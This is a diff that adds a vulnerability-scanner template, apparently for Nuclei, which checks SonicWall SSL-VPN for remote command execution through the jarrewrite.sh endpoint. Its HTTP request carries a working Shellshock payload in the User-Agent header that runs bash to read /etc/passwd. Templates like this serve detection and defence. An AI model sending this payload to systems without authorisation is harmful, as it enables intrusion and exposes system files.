@@ -1,0 +1,29 @@
+id: sonicwall-ssl-vpn-rce
+info:
+  name: SonicWall SSL-VPN Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template detects remote code execution vulnerability in SonicWall SSL-VPN via the `jarrewrite.sh` endpoint.
+http:
+  - raw:
+      - |
+        GET /cgi-bin/jarrewrite.sh HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+      - type: word
+        part: body
+        words:
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<!DOCTYPE"
+        negative: true
